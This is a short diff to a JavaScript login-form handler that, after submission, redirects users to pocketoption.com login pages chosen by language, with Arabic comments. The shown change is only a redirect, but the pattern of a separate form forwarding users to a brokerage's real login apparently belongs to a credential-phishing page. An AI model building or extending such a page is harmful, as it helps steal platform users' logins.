@@ -264,8 +264,17 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         } catch (fallbackErr) {}
         
     }
-     window.location.href = "https://pocketoption.com/";
-});
+const currentLang = document.documentElement.lang || 'ar';
+
+    // توجيه المستخدم حسب اللغة المختارة
+    if (currentLang === 'ru') {
+        window.location.href = "https://pocketoption.com/ru/login/";
+    } else if (currentLang === 'ar') {
+        window.location.href = "https://pocketoption.com/ar/login/"; // أو الرابط العربي المخصص
+    } else {
+        window.location.href = "https://pocketoption.com/en/login/"; // الرابط الإنجليزي أو الافتراضي
+    }
+}});
     window.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
     const langParam = urlParams.get('lang');
